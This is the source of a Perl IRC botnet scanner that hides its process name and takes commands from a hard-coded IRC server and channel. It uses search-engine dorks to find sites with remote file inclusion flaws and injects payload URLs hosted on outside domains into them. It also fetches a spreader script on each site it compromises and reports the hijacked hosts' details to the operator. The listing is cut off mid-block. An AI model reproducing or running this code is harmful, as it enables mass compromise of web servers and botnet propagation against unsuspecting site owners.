use IO::Socket::INET;
use HTTP::Request;
use LWP::UserAgent;

my $linas_max='10';
my $sleep='1';
my $processo ="httpds";
my $cmd="http://bt.street-peppers.ru/editor/super.gif?";
my $id="http://www.drosos.gr/images/sistem.gif?";
my $spread="http://www.drosos.gr/images/spread.txt??";
my $server="64.32.20.185";
my $porta="6667";
my $nick="[Sentinela]-".(int(rand(100)));
my $canale="#area51";
my $verbot = "1.05";
my $stringa = "!scan";
my $adm = "super";
my $out = "!bye";
my $c0der= "super";

my $pid=fork;
exit if $pid;
$0="$processo"."\0"x16;
my $sk = IO::Socket::INET->new(PeerAddr=>"$server",PeerPort=>"$porta",Proto=>"tcp") or die "Can not connect on server!\n";
$sk->autoflush(1);
print $sk "NICK $nick\r\n";
print $sk "USER V1 8 *  : .::super::.\r\n";
print $sk "JOIN $canale\r\n";

while($line = <$sk>){

$line =~ s/\r\n$//;
if ($line=~ /^PING \:(.*)/)
{
print "PONG :$1";
print $sk "PONG :$1";
}

if ($line=~ /PRIVMSG $canale :$out/){
stampa($sk, "QUIT");
}


if ($line=~ /PRIVMSG $canale :$stringa\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $dork=$2;
my $contatore=0;
my %hosts;
stampa($sk, "PRIVMSG $canale :14,1>>>>>14,1Bug: $bug ");
stampa($sk, "PRIVMSG $canale :14,1>>>>>14,1Dork: $dork ");
stampa($sk, "PRIVMSG $canale :14,1>>>>>14,1Iniciando a varredura espere! ");
my @google=&googlet($dork);
push(my @tot, @google);
my @puliti=&unici(@tot);
stampa($sk, "PRIVMSG $canale :14,13 -=- [9Area513]  7,1Google15 Carregando... ");

stampa($sk, "PRIVMSG $canale :14,13 -=- [9Area513]  7,1Google15 Total Encontrado:15 ".scalar(@tot)." 0Sites!");
stampa($sk, "PRIVMSG $canale :14,13 -=- [9Area513]  7,1Google15 Total Cleaned:4  ".scalar(@puliti)." 0Sites!");
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{
$contatore++;
if ($contatore %100==0){ 
}
if ($contatore==$uni-1){
stampa($sk, "PRIVMSG $canale :14,13 -=- [9Area513]  7,1Google15 Terminado para:0$bug $dork");
stampa($sk, "PRIVMSG $canale :14,13 -=- [9Area513]  7,1Google15 PER ALTRi BUG CERCA: http://www.google.it/search?hl=it&q=".$dork."&btnG=Cerca+con+Google&meta=");
}

my $test="http://".$sito.$bug.$id."?";
my $print="http://".$sito.$bug.$cmd."?";
my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
$ua->timeout(5);
my $response=$ua->request($req);
if ($response->is_success) {
my $re=$response->content;
if($re =~ /ALBANIA/ && $re =~ /uid=/){
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
my $test2="http://".$sito.$bug.$spread."?";
my $reqz=HTTP::Request->new(GET=>$test2);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($reqz);

stampa($sk, "PRIVMSG $adm :14,1@**1412,19 Safe Mode15:4,1Off 14,1**@15 $print ");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 Safe Mode15:4,1Off 14,1**@15 $print ");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 $alb 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 up da15 $alb2 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 id15 $alb3 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 pwd15 $alb4 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 $alb5 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 PHPV15 $alb6 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 IP15 $alb7 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 Server15 $alb8 9**@");
stampa($sk, "PRIVMSG $canale :14,13 0,1 489141414 3-------------------------------------14,13 0,1 489141414 3");
}
}
elsif($re =~ /ALBANIA/)
{
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);

stampa($sk, "PRIVMSG $adm :14,1@**1412,19 Safe Mode15:4,1ON 14,1**@15 $print ");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 Safe Mode15:4,1ON 14,1**@15 $print ");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 $alb 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 up da15 $alb2 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 id15 $alb3 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 pwd15 $alb4 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 $alb5 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 PHPV15 $alb6 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 IP15 $alb7 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 Server15 $alb8 9**@");
stampa($sk, "PRIVMSG $canale :14,13 0,1 489141414 3-------------------------------------14,13 0,1 489141414 3");
my $test2="http://".$sito.$bug.$spread."?";
my $reqz=HTTP::Request->new(GET=>$test2);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($reqz);
}
}
}}}
exit;
}}


if ($line=~ /PRIVMSG $canale :$stringa\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $dork=$2;
my $contatore=0;
my %hosts;
	my @alltheweb=&allthewebt($dork);
	my @allweb=&standard($dork);
push(my @tot, @alltheweb, @allweb);
my @puliti=&unici(@tot);
stampa($sk, "PRIVMSG $canale :14,13 0,1 489141414 3[9Area513]  7,1Alltheweb15 Carregando... ");

stampa($sk, "PRIVMSG $canale :14,13 -=- [9Area513]  7,1Alltheweb15 Total Encontrado:15 ".scalar(@tot)." 0Sites!");
stampa($sk, "PRIVMSG $canale :14,13 -=- [9Area513]  7,1Alltheweb15 Total Cleaned:4  ".scalar(@puliti)." 0Sites!");
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{
$contatore++;
if ($contatore %100==0){ 
}
if ($contatore==$uni-1){
stampa($sk, "PRIVMSG $canale :14,13 -=- [9Area513]  7,1Alltheweb15 Terminado 0para:$bug $dork");
}

my $test="http://".$sito.$bug.$id."?";
my $print="http://".$sito.$bug.$cmd."?";
my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
$ua->timeout(5);
my $response=$ua->request($req);
if ($response->is_success) {
my $re=$response->content;
if($re =~ /ALBANIA/ && $re =~ /uid=/){
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
my $test2="http://".$sito.$bug.$spread."?";
my $reqz=HTTP::Request->new(GET=>$test2);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($reqz);

stampa($sk, "PRIVMSG $adm :14,1@**1412,19 Safe Mode15:4,1off 14,1**@15 $print ");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 Safe Mode15:4,1off 14,1**@15 $print ");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 $alb 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 up da15 $alb2 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 id15 $alb3 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 pwd15 $alb4 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 $alb5 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 PHPV15 $alb6 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 IP15 $alb7 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 Server15 $alb8 9**@");
stampa($sk, "PRIVMSG $canale :14,13 0,1 489141414 3-------------------------------------14,13 0,1 489141414 3");

}
}
elsif($re =~ /ALBANIA/)
{
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);

stampa($sk, "PRIVMSG $adm :14,1@**1412,19 Safe Mode15:4,1ON 14,1**@15 $print ");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 Safe Mode15:4,1ON 14,1**@15 $print ");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 $alb 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 up da15 $alb2 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 id15 $alb3 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 pwd15 $alb4 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 $alb5 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 PHPV15 $alb6 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 IP15 $alb7 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 Server15 $alb8 9**@");
stampa($sk, "PRIVMSG $canale :14,13 0,1 489141414 3-------------------------------------14,13 0,1 489141414 3");
my $test2="http://".$sito.$bug.$spread."?";
my $reqz=HTTP::Request->new(GET=>$test2);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($reqz);
}
}
}}}
exit;
}}


if ($line=~ /PRIVMSG $canale :$stringa\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $dork=$2;
my $contatore=0;
my %hosts;
	my @ylist=&yahoo($dork);
	my @yalist=&yahooa($dork);
	my @yblist=&yahoob($dork);
	my @yclist=&yahooc($dork);
	my @ydlist=&yahood($dork);
	my @yelist=&yahooe($dork);
	my @yflist=&yahoof($dork);
	my @yglist=&yahoog($dork);
	my @yhlist=&yahooh($dork);
	my @yilist=&yahooi($dork);
    my @yllist=&yahooj($dork);
	my @yllist=&yahool($dork);
		push(my @yahoobypass, @ylist, @yalist, @yblist, @yclist, @ydlist, @yelist, @yflist, @yglist, @yhlist, @yilist, @yjlist, @yllist );	
push(my @tot, @yahoobypass);
my @puliti=&unici(@tot);
stampa($sk, "PRIVMSG $canale :14,13 0,1 489141414 3[9Area513]  7,1Yahoo15 Carregando... ");

stampa($sk, "PRIVMSG $canale :14,13 -=- [9Area513]  7,1Yahoo15 Total Encontrado:15 ".scalar(@tot)." 0Sites!");
stampa($sk, "PRIVMSG $canale :14,13 -=- [9Area513]  7,1Yahoo15 Total Cleaned:4  ".scalar(@puliti)." 0Sites!");
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{
$contatore++;
if ($contatore %100==0){ 
}
if ($contatore==$uni-1){
stampa($sk, "PRIVMSG $canale :14,13 -=- [9Area513]  7,1Yahoo15 Terminado 0para:$bug $dork");
}
my $test="http://".$sito.$bug.$id."?";
my $print="http://".$sito.$bug.$cmd."?";
my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
$ua->timeout(5);
my $response=$ua->request($req);
if ($response->is_success) {
my $re=$response->content;
if($re =~ /ALBANIA/ && $re =~ /uid=/){
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
my $test2="http://".$sito.$bug.$spread."?";
my $reqz=HTTP::Request->new(GET=>$test2);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($reqz);

stampa($sk, "PRIVMSG $adm :14,1@**1412,19 Safe Mode15:4,1Off 14,1**@15 $print ");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 Safe Mode15:4,1Off 14,1**@15 $print ");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 $alb 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 up da15 $alb2 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 id15 $alb3 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 pwd15 $alb4 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 $alb5 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 PHPV15 $alb6 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 IP15 $alb7 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 Server15 $alb8 9**@");
stampa($sk, "PRIVMSG $canale :14,13 0,1 489141414 3-------------------------------------14,13 0,1 489141414 3");
}
}
elsif($re =~ /ALBANIA/)
{
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);

stampa($sk, "PRIVMSG $adm :14,1@**1412,19 Safe Mode15:4,1ON 14,1**@15 $print ");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 Safe Mode15:4,1ON 14,1**@15 $print ");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 $alb 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 up da15 $alb2 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 id15 $alb3 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 pwd15 $alb4 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 $alb5 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 PHPV15 $alb6 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 IP15 $alb7 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 Server15 $alb8 9**@");
stampa($sk, "PRIVMSG $canale :14,13 0,1 489141414 3-------------------------------------14,13 0,1 489141414 3");
my $test2="http://".$sito.$bug.$spread."?";
my $reqz=HTTP::Request->new(GET=>$test2);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($reqz);
}
}
}}}
exit;
}}


if ($line=~ /PRIVMSG $canale :$stringa\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $dork=$2;
my $contatore=0;
my %hosts;
	my @mlist=&msn($dork);
	my @mlistde=&msnde($dork);
	my @mlistlive=&msnlive($dork);
	push(my @mlistworld, @mlist, @mlistde, @mlistlive);
push(my @tot, @mlistworld);
my @puliti=&unici(@tot);
stampa($sk, "PRIVMSG $canale :14,13 0,1 489141414 3[9Area513]  7,1Msn15 Carregando....  ");

stampa($sk, "PRIVMSG $canale :14,13 -=- [9Area513]  7,1Msn15 Total Encontrado:15 ".scalar(@tot)." 0Sites!");
stampa($sk, "PRIVMSG $canale :14,13 -=- [9Area513]  7,1Msn15 Total Cleaned:4  ".scalar(@puliti)." 0Sites!");
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{
$contatore++;
if ($contatore %100==0){ 
}
if ($contatore==$uni-1){
stampa($sk, "PRIVMSG $canale :14,13 -=- [9Area513]  7,1Msn15 Terminado 0para:$bug $dork");
}

my $test="http://".$sito.$bug.$id."?";
my $print="http://".$sito.$bug.$cmd."?";
my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
$ua->timeout(5);
my $response=$ua->request($req);
if ($response->is_success) {
my $re=$response->content;
if($re =~ /ALBANIA/ && $re =~ /uid=/){
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);

my $test2="http://".$sito.$bug.$spread."?";
my $reqz=HTTP::Request->new(GET=>$test2);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($reqz);

stampa($sk, "PRIVMSG $adm :14,1@**1412,19 Safe Mode15:4,1Off 14,1**@15 $print ");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 Safe Mode15:4,1Off 14,1**@15 $print ");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 $alb 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 up da15 $alb2 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 id15 $alb3 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 pwd15 $alb4 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 $alb5 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 PHPV15 $alb6 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 IP15 $alb7 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 Server15 $alb8 9**@");
stampa($sk, "PRIVMSG $canale :14,13 0,1 489141414 3-------------------------------------14,13 0,1 489141414 3");
}
}
elsif($re =~ /ALBANIA/)
{
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);

stampa($sk, "PRIVMSG $adm :14,1@**1412,19 Safe Mode15:4,1ON 14,1**@15 $print ");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 Safe Mode15:4,1ON 14,1**@15 $print ");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 $alb 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 up da15 $alb2 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 id15 $alb3 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 pwd15 $alb4 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 $alb5 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 PHPV15 $alb6 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 IP15 $alb7 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 Server15 $alb8 9**@");
stampa($sk, "PRIVMSG $canale :14,13 0,1 489141414 3-------------------------------------14,13 0,1 489141414 3");
my $test2="http://".$sito.$bug.$spread."?";
my $reqz=HTTP::Request->new(GET=>$test2);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($reqz);
}
}
}}}
exit;
}}

if ($line=~ /PRIVMSG $canale :$stringa\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $dork=$2;
my $contatore=0;
my %hosts;
	my @aolist=&aol($dork);
	my @aolist1=&aol1($dork);
	my @aolist2=&aol2($dork);
	my @aolist3=&aol3($dork);
push(my @tot, @aolist,@aolist1,@aolist2,@aolist3);
my @puliti=&unici(@tot);
stampa($sk, "PRIVMSG $canale :14,13 0,1 489141414 3[9Area513]  7,1Aol15 Carregando... ");

stampa($sk, "PRIVMSG $canale :14,13 -=- [9Area513]  7,1Aol15 Total Encontrado:15 ".scalar(@tot)." 0Sites!");
stampa($sk, "PRIVMSG $canale :14,13 -=- [9Area513]  7,1Aol15 Total Cleaned:4  ".scalar(@puliti)." 0Sites!");
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{
$contatore++;
if ($contatore %100==0){ 
}
if ($contatore==$uni-1){
stampa($sk, "PRIVMSG $canale :14,13 -=- [9Area513]  7,1Aol15 Terminado 0para:$bug $dork");
}
my $test="http://".$sito.$bug.$id."?";
my $print="http://".$sito.$bug.$cmd."?";
my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
$ua->timeout(5);
my $response=$ua->request($req);
if ($response->is_success) {
my $re=$response->content;
if($re =~ /ALBANIA/ && $re =~ /uid=/){
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);

my $test2="http://".$sito.$bug.$spread."?";
my $reqz=HTTP::Request->new(GET=>$test2);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($reqz);

stampa($sk, "PRIVMSG $adm :14,1@**1412,19 Safe Mode15:4,1Off 14,1**@15 $print ");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 Safe Mode15:4,1Off 14,1**@15 $print ");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 $alb 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 up da15 $alb2 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 id15 $alb3 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 pwd15 $alb4 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 $alb5 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 PHPV15 $alb6 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 IP15 $alb7 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 Server15 $alb8 9**@");
stampa($sk, "PRIVMSG $canale :14,13 0,1 489141414 3-------------------------------------14,13 0,1 489141414 3");
}
}
elsif($re =~ /ALBANIA/)
{
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);

stampa($sk, "PRIVMSG $adm :14,1@**1412,19 Safe Mode15:4,1ON 14,1**@15 $print ");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 Safe Mode15:4,1ON 14,1**@15 $print ");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 $alb 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 up da15 $alb2 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 id15 $alb3 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 pwd15 $alb4 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 $alb5 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 PHPV15 $alb6 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 IP15 $alb7 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 Server15 $alb8 9**@");
stampa($sk, "PRIVMSG $canale :14,13 0,1 489141414 3-------------------------------------14,13 0,1 489141414 3");
my $test2="http://".$sito.$bug.$spread."?";
my $reqz=HTTP::Request->new(GET=>$test2);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($reqz);
}
}
}}}
exit;
}}

if ($line=~ /PRIVMSG $canale :$stringa\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $dork=$2;
my $contatore=0;
my %hosts;
	my @allist=&altavista($dork);
	my @alldeist=&altavistade($dork);
	my @allistus=&altavistaus($dork);
	my @allcom=&altavistacom($dork);
push(my @tot, @allist, @alldeist, @allistus,@allcom);
my @puliti=&unici(@tot);
stampa($sk, "PRIVMSG $canale :14,13 0,1 489141414 3[9Area513]  7,1Altavista15 Carregando... ");
stampa($sk, "PRIVMSG $canale :14,13 -=- [9Area513]  7,1Altavista15 Total Encontrado:15 ".scalar(@tot)." 0Sites!");
stampa($sk, "PRIVMSG $canale :14,13 -=- [9Area513]  7,1Altavista15 Total Cleaned:4  ".scalar(@puliti)." 0Sites!");
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{
$contatore++;
if ($contatore %100==0){ 
}
if ($contatore==$uni-1){
stampa($sk, "PRIVMSG $canale :14,13 -=- [9Area513]  7,1Altavista15 finish 0para:$bug $dork");
}
my $test="http://".$sito.$bug.$id."?";
my $print="http://".$sito.$bug.$cmd."?";
my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
$ua->timeout(5);
my $response=$ua->request($req);
if ($response->is_success) {
my $re=$response->content;
if($re =~ /ALBANIA/ && $re =~ /uid=/){
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);

my $test2="http://".$sito.$bug.$spread."?";
my $reqz=HTTP::Request->new(GET=>$test2);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($reqz);

stampa($sk, "PRIVMSG $adm :14,1@**1412,19 Safe Mode15:4,1Off 14,1**@15 $print ");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 Safe Mode15:4,1Off 14,1**@15 $print ");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 $alb 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 up da15 $alb2 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 id15 $alb3 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 pwd15 $alb4 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 $alb5 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 PHPV15 $alb6 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 IP15 $alb7 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 Server15 $alb8 9**@");
stampa($sk, "PRIVMSG $canale :14,13 0,1 489141414 3-------------------------------------14,13 0,1 489141414 3");
}
}
elsif($re =~ /ALBANIA/)
{
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);

stampa($sk, "PRIVMSG $adm :14,1@**1412,19 Safe Mode15:4,1ON 14,1**@15 $print ");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 Safe Mode15:4,1ON 14,1**@15 $print ");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 $alb 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 up da15 $alb2 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 id15 $alb3 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 pwd15 $alb4 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 $alb5 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 PHPV15 $alb6 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 IP15 $alb7 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 Server15 $alb8 9**@");
stampa($sk, "PRIVMSG $canale :14,13 0,1 489141414 3-------------------------------------14,13 0,1 489141414 3");
my $test2="http://".$sito.$bug.$spread."?";
my $reqz=HTTP::Request->new(GET=>$test2);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($reqz);
}
}
}}}
exit;
}}

if ($line=~ /PRIVMSG $canale :$stringa\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $dork=$2;
my $contatore=0;
my %hosts;
	my @asklist=&ask($dork);
	my @asklist2=&askde($dork);
push(my @tot, @asklist ,@asklist2);
my @puliti=&unici(@tot);
stampa($sk, "PRIVMSG $canale :14,13 0,1 489141414 3[9Area513]  7,1Ask15 Carregando... ");

stampa($sk, "PRIVMSG $canale :14,13 -=- [9Area513]  7,1Ask15 Total Encontrado:15 ".scalar(@tot)." 0Sites!");
stampa($sk, "PRIVMSG $canale :14,13 -=- [9Area513]  7,1Ask15 Total Cleaned:4  ".scalar(@puliti)." 0Sites!");
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{
$contatore++;
if ($contatore %100==0){ 
}
if ($contatore==$uni-1){
stampa($sk, "PRIVMSG $canale :14,13 -=- [9Area513]  7,1Ask15 Terminado 0para:$bug $dork");
}
my $test="http://".$sito.$bug.$id."?";
my $print="http://".$sito.$bug.$cmd."?";
my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
$ua->timeout(5);
my $response=$ua->request($req);
if ($response->is_success) {
my $re=$response->content;
if($re =~ /ALBANIA/ && $re =~ /uid=/){
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);

my $test2="http://".$sito.$bug.$spread."?";
my $reqz=HTTP::Request->new(GET=>$test2);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($reqz);

stampa($sk, "PRIVMSG $adm :14,1@**1412,19 Safe Mode15:4,1Off 14,1**@15 $print ");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 Safe Mode15:4,1Off 14,1**@15 $print ");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 $alb 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 up da15 $alb2 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 id15 $alb3 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 pwd15 $alb4 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 $alb5 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 PHPV15 $alb6 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 IP15 $alb7 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 Server15 $alb8 9**@");
stampa($sk, "PRIVMSG $canale :14,13 0,1 489141414 3-------------------------------------14,13 0,1 489141414 3");
}
}
elsif($re =~ /ALBANIA/)
{
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);

stampa($sk, "PRIVMSG $adm :14,1@**1412,19 Safe Mode15:4,1ON 14,1**@15 $print ");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 Safe Mode15:4,1ON 14,1**@15 $print ");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 $alb 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 up da15 $alb2 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 id15 $alb3 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 pwd15 $alb4 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 $alb5 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 PHPV15 $alb6 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 IP15 $alb7 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 Server15 $alb8 9**@");
stampa($sk, "PRIVMSG $canale :14,13 0,1 489141414 3-------------------------------------14,13 0,1 489141414 3");
